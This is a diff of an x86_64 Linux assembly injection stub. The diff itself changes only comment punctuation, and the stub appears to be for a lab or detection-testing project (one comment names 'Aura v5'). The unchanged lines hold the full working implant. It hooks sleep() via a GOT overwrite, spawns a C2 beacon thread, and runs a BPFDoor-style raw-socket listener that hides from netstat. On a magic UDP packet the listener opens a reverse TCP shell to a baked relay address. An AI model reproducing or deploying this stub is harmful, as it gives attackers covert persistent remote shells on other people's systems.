@@ -1,4 +1,4 @@
-; inject_stub.asm — x86_64 Linux process injection stub (Fase 3: passive raw socket C2)
+; inject_stub.asm   x86_64 Linux process injection stub (Fase 3: passive raw socket C2)
 ; NASM syntax. Build with: nasm -f bin -o stub.bin stub.asm
 ;
 ; BLOB LAYOUT:
@@ -10,7 +10,7 @@
 ;   +0x010  [8]  thread_stack   UNUSED at runtime (same reason)
 ;   +0x018  [8]  trampoline_target  resolved VA of real sleep()             ← patched
 ;   +0x020  [8]  magic_key      8-byte shared key for rawsock validation    ← patched
-;   +0x028  [4]  rawsock_cb_ip  relay direct IPv4 NBO — rawsock callback IP ← patched
+;   +0x028  [4]  rawsock_cb_ip  relay direct IPv4 NBO   rawsock callback IP ← patched
 ;   +0x02C  [2]  rawsock_cb_port relay callback port NBO (9443)             ← patched
 ;   +0x02E  [0x62] padding
 ;   +0x090  [CODE] hook_entry
@@ -24,10 +24,10 @@
 ;   +end    sh_path  "/bin/sh\0"
 ;
 ; MAGIC PACKET FORMAT (UDP, any destination port):
-;   bytes [0:8]   = magic_key   (8 bytes — must match blob+0x020)
+;   bytes [0:8]   = magic_key   (8 bytes   must match blob+0x020)
 ;
-; Callback IP:port are baked into the blob (+0x028/+0x02C) — relay direct IP:9443.
-; Packet source IP is irrelevant — bat-server may be on a different network (I-01 model).
+; Callback IP:port are baked into the blob (+0x028/+0x02C)   relay direct IP:9443.
+; Packet source IP is irrelevant   bat-server may be on a different network (I-01 model).
 ;
 ; DETECTION SURFACE (for Aura v5):
 ;   - openat("/proc/PID/mem") with write flags
@@ -38,7 +38,7 @@
 
 bits 64
 
-; ── DATA HEADER ──────────────────────────────────────────────────────────────
+;  DATA HEADER                                                              
 blob_start:
 spawned_flag:       dq 0                        ; +0x000  unused
 c2_ip:              dd 0                        ; +0x008  IPv4 NBO (patched)
@@ -51,7 +51,7 @@ rawsock_cb_ip:      dd 0                        ; +0x028  callback IPv4 NBO (rel
 rawsock_cb_port:    dw 0                        ; +0x02C  callback port NBO (patched)
                     times (0x090 - 0x02E) db 0  ; +0x02E..+0x08F padding
 
-; ── HOOK ENTRY ───────────────────────────────────────────────────────────────
+;  HOOK ENTRY                                                              
 ; Runs at INJECT_BASE+0x090 when target calls sleep() via our GOT overwrite.
 ; Spawns beacon thread + rawsock thread, then trampolines to real sleep().
 ;
@@ -80,26 +80,26 @@ hook_entry:                                     ; = +0x090
 
     lea     rbx, [rel blob_start]   ; rbx = INJECT_BASE
 
-    ; ── Spawned guard — prevent thread explosion ──────────────────────────────
+    ;  Spawned guard   prevent thread explosion                              
     ; spawned_flag is at blob+0x000. The code cave is r-xp, so we cannot write
     ; it directly. On first entry: mprotect the cave page to RWX, set the flag.
     ; On all subsequent calls: flag=1 → skip spawn, just trampoline to real sleep().
     ; This ensures exactly one beacon + one rawsock thread are ever spawned.
     cmp     byte [rbx], 1
-    je      .trampoline             ; already spawned — forward to real sleep()
+    je      .trampoline             ; already spawned   forward to real sleep()
 
     ; mprotect(page_base(rbx), 4096, PROT_READ|PROT_WRITE|PROT_EXEC=7)
-    ; Stays RWX permanently — acceptable for lab; avoids a second mprotect call.
+    ; Stays RWX permanently   acceptable for lab; avoids a second mprotect call.
     mov     rdi, rbx
     and     rdi, -4096              ; page-align (AND with 0xFFFFFFFFFFFFF000)
     mov     rsi, 4096
     mov     rdx, 7                  ; PROT_READ|PROT_WRITE|PROT_EXEC
     mov     rax, 10                 ; SYS_mprotect
-    syscall                         ; ignore return — failure is non-fatal
+    syscall                         ; ignore return   failure is non-fatal
 
     mov     byte [rbx], 1           ; spawned_flag = 1
 
-    ; ── Beacon thread stack ───────────────────────────────────────────────────
+    ;  Beacon thread stack                                                  
     ; mmap(NULL, 64KB, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0)
     mov     rax, 9
     xor     rdi, rdi
@@ -111,7 +111,7 @@ hook_entry:                                     ; = +0x090
     syscall
 
     test    rax, rax
-    js      .trampoline             ; mmap failed — skip both threads
+    js      .trampoline             ; mmap failed   skip both threads
 
     mov     r12, rax
     add     r12, 0xF000             ; r12 = beacon stack top (4KB guard at bottom)
@@ -136,7 +136,7 @@ hook_entry:                                     ; = +0x090
     jz      .beacon_entry           ; child → beacon loop
     js      .trampoline             ; clone error → skip rawsock
 
-    ; ── Rawsock thread stack ──────────────────────────────────────────────────
+    ;  Rawsock thread stack                                                  
     mov     rax, 9
     xor     rdi, rdi
     mov     rsi, 0x10000
@@ -147,7 +147,7 @@ hook_entry:                                     ; = +0x090
     syscall
 
     test    rax, rax
-    js      .trampoline             ; mmap failed — rawsock unavailable
+    js      .trampoline             ; mmap failed   rawsock unavailable
 
     add     rax, 0xF000
     mov     r15, rax                ; r15 = rawsock stack top
@@ -164,7 +164,7 @@ hook_entry:                                     ; = +0x090
     test    rax, rax
     jz      .rawsock_entry          ; child → rawsock listener
 
-    ; parent (or clone error) — fall through to trampoline
+    ; parent (or clone error)   fall through to trampoline
 
 .trampoline:
     add     rsp, 8
@@ -183,9 +183,9 @@ hook_entry:                                     ; = +0x090
     pop     rdx
     pop     rcx
     pop     rax
-    jmp     [rel trampoline_target] ; indirect 6-byte JMP — no ±2GB limit
+    jmp     [rel trampoline_target] ; indirect 6-byte JMP   no ±2GB limit
 
-; ── BEACON ENTRY ─────────────────────────────────────────────────────────────
+;  BEACON ENTRY                                                            
 ; Child thread: RSP = r12 (beacon stack top). C2 config at [rsp-0x020].
 
 .beacon_entry:
@@ -252,17 +252,17 @@ hook_entry:                                     ; = +0x090
 
     jmp     .beacon_loop
 
-; ── RAWSOCK ENTRY ────────────────────────────────────────────────────────────
+;  RAWSOCK ENTRY                                                            
 ; BPFDoor-style passive C2: AF_PACKET raw socket listens for magic packet.
-; No open TCP/UDP ports — invisible to ss/netstat.
+; No open TCP/UDP ports   invisible to ss/netstat.
 ;
 ; Magic packet (UDP, any destination):
-;   payload[0:8]  = magic_key  (8 bytes — must match blob+0x020)
+;   payload[0:8]  = magic_key  (8 bytes   must match blob+0x020)
 ;
 ; On match: TCP connect to blob.rawsock_cb_ip:blob.rawsock_cb_port →
 ;   fork → dup2(0/1/2) → execve /bin/sh
 ;
-; Callback address is BAKED into blob (+0x028/+0x02C) — relay direct IP:port.
+; Callback address is BAKED into blob (+0x028/+0x02C)   relay direct IP:port.
 ; This allows the magic packet to be sent from any source (bat-server local)
 ; while the reverse connection goes to the relay (same VPC as target).
 ;
@@ -291,12 +291,12 @@ hook_entry:                                     ; = +0x090
     syscall
 
     test    rax, rax
-    js      .rs_exit                ; no CAP_NET_RAW or other error — give up
+    js      .rs_exit                ; no CAP_NET_RAW or other error   give up
 
     mov     r12, rax                ; r12 = raw_fd
 
 .rs_loop:
-    ; recvfrom(raw_fd, buf, 2048, 0, NULL, NULL)  — blocking
+    ; recvfrom(raw_fd, buf, 2048, 0, NULL, NULL)    blocking
     mov     rax, 45
     mov     rdi, r12
     mov     rsi, r13
@@ -311,40 +311,40 @@ hook_entry:                                     ; = +0x090
     cmp     rax, 52
     jl      .rs_loop
 
-    ; ── Ethernet: Ethertype must be IPv4 (0x0800) ────────────────────────────
+    ;  Ethernet: Ethertype must be IPv4 (0x0800)                            
     ; Bytes [12:14] in frame = Ethertype. On LE: [0x08,0x00] → word = 0x0008
     movzx   ecx, word [r13 + 12]
     cmp     ecx, 0x0008
     jne     .rs_loop
 
-    ; ── IP: protocol must be UDP (17 = 0x11) ─────────────────────────────────
+    ;  IP: protocol must be UDP (17 = 0x11)                                
     ; IP header starts at r13+14. Protocol byte is at offset 9 → frame offset 23.
     movzx   ecx, byte [r13 + 23]
     cmp     ecx, 17
     jne     .rs_loop
 
-    ; ── IP header length: lower nibble of first IP byte × 4 ──────────────────
+    ;  IP header length: lower nibble of first IP byte × 4                  
     movzx   ecx, byte [r13 + 14]
     and     ecx, 0x0F
     shl     ecx, 2                  ; ecx = IHL in bytes (typically 20)
     lea     r14, [r13 + 14]
     add     r14, rcx                ; r14 = UDP header start
 
-    ; ── UDP payload: bytes [0:8] must equal magic_key ────────────────────────
+    ;  UDP payload: bytes [0:8] must equal magic_key                        
     ; UDP header = 8 bytes; payload starts at r14+8
     mov     rax, qword [r14 + 8]    ; first 8 payload bytes (raw, LE word)
     mov     rcx, qword [rbx + 0x020]; magic_key (patched, same raw layout)
     cmp     rax, rcx
     jne     .rs_loop
 
-    ; ── Extract callback address from blob (baked relay IP + port) ───────────
+    ;  Extract callback address from blob (baked relay IP + port)          
     ; Using baked values allows magic packet to be sent from any source:
     ; bat-server (local) → target public IP → rawsock validates key →
     ; callback to relay direct IP:9443 → SSH tunnel → bat-server local.
     mov     r15d, dword [rbx + 0x028] ; rawsock_cb_ip (relay direct IPv4, NBO)
     movzx   r8d,  word  [rbx + 0x02C] ; rawsock_cb_port (baked port, NBO)
 
-    ; ── Reverse TCP connection ────────────────────────────────────────────────
+    ;  Reverse TCP connection                                                
     ; socket(AF_INET=2, SOCK_STREAM=1, 0)
     mov     rax, 41
     mov     rdi, 2
@@ -352,7 +352,7 @@ hook_entry:                                     ; = +0x090
     xor     rdx, rdx
     syscall
     test    rax, rax
-    js      .rs_loop                ; socket failed — retry on next packet
+    js      .rs_loop                ; socket failed   retry on next packet
 
     mov     r11, rax                ; r11 = connect_fd
 
@@ -373,9 +373,9 @@ hook_entry:                                     ; = +0x090
     add     rsp, 16
 
     test    rax, rax
-    jnz     .rs_close               ; connect failed — close socket, continue loop
+    jnz     .rs_close               ; connect failed   close socket, continue loop
 
-    ; ── fork → dup2 → execve /bin/sh ─────────────────────────────────────────
+    ;  fork → dup2 → execve /bin/sh                                        
     ; fork() creates a child process inheriting the connection fd.
     ; Child executes the shell; parent closes its copy and keeps listening.
     mov     rax, 57                 ; SYS_fork
@@ -384,17 +384,17 @@ hook_entry:                                     ; = +0x090
     jnz     .rs_close               ; parent (rax=child_pid) or fork error → close + loop
 
     ; CHILD (rax=0): stdio → connect_fd, then execve /bin/sh
-    ; dup2(r11, 0) — stdin
+    ; dup2(r11, 0)   stdin
     mov     rdi, r11
     xor     rsi, rsi
     mov     rax, 33
     syscall
-    ; dup2(r11, 1) — stdout
+    ; dup2(r11, 1)   stdout
     mov     rdi, r11
     mov     rsi, 1
     mov     rax, 33
     syscall
-    ; dup2(r11, 2) — stderr
+    ; dup2(r11, 2)   stderr
     mov     rdi, r11
     mov     rsi, 2
     mov     rax, 33
@@ -412,8 +412,8 @@ hook_entry:                                     ; = +0x090
     mov     rax, 59
     syscall
 
-    ; execve failed (should not happen with /bin/sh present) — child exits cleanly
-    mov     rax, 60                 ; SYS_exit (NOT SYS_exit_group — don't kill cron)
+    ; execve failed (should not happen with /bin/sh present)   child exits cleanly
+    mov     rax, 60                 ; SYS_exit (NOT SYS_exit_group   don't kill cron)
     xor     rdi, rdi
     syscall
 
@@ -425,11 +425,11 @@ hook_entry:                                     ; = +0x090
     jmp     .rs_loop
 
 .rs_exit:
-    ; Thread exit — socket() failed (e.g. CAP_NET_RAW denied). Exit cleanly.
+    ; Thread exit   socket() failed (e.g. CAP_NET_RAW denied). Exit cleanly.
     mov     rax, 60                 ; SYS_exit
     xor     rdi, rdi
     syscall
 
-; ── STRING DATA ──────────────────────────────────────────────────────────────
+;  STRING DATA                                                              
 ; In the code cave (r-xp). Readable for execve pathname arg. NOT written at runtime.
 sh_path: db "/bin/sh", 0
